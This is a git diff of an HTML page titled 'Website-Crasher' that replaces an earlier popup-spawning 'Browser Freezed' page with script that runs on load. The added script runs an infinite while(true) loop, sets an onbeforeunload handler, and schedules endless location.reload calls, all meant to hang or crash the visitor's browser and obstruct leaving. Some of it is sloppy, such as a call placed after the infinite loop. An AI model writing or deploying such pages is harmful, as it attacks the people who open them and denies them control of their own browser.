@@ -1,27 +1,38 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Your Browser Got Freezed</title>
-</head>
-<style>
-    h1{
-        text-align: center;
-        color: red;
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Website-Crasher</title>
+  <link href="/src/style.css" rel="stylesheet" type="text/css" />
+  <style>
+    html, body {
+      height: 100%;
+      width: 100%;
+      text-align: center;
+      background-color: black;
     }
-</style>
+    h1 {
+      font-size: 50px;
+      color: white;
+    }
+  </style>
+</head>
 
-
-<body onload="CrashAndBurn(self.location,'_blank');CrashAndBurn(self.location,'_blank');">
-<h1>Browser Freezed</h1>
+<body>
+  <h1>Crashing in progress...</h1>
+  <script src="/src/script.js"></script>
+  <script>
+  onbeforeunload = function(){localStorage.x=1};
+  
+  while(true) {
+    document.getElementById('messWithYou').className = "messItUp";
+    onbeforeunload = function(){localStorage.x=1};
+    setTimeout(function(){
+      while(1)location.reload(1)
+    }, 10000)
+  }  
+   messWithYou();
+  </script>
 </body>
-<script type="text/javascript">
-    // function CrashAndBurn(url) { popupWindow = window.open( url,'_blank') }
-    // while(true) {
-    //     for(let i = 99; i === i; i *= i) {
-    //         console.log(i);
-    //     }
-    // }
-
-</script>
 </html>
